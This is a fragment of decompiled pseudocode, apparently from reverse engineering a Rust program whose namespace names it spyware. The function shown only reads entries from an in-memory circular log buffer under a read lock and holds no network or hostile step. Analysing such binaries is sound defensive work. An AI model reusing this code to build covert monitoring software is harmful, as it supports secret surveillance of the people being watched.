__int64 __fastcall spyware::logging::core::MemoryLogger::get_logs(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rbx
  _BYTE v6[48]; // [rsp+8h] [rbp-30h] BYREF

  std::sys::sync::rwlock::futex::RwLock::read(a2 + 24);
  std::sync::rwlock::RwLockReadGuard<T>::new(v6, a2 + 24);
  v2 = core::result::Result<T,E>::unwrap(v6);
  v4 = v3;
  spyware::logging::memory_logger::CircularMemoryLogs::get_all_logs(a1, v2);
  return core::ptr::drop_in_place<std::sync::rwlock::RwLockReadGuard<alloc::vec::Vec<alloc::string::String>>>(v4);
}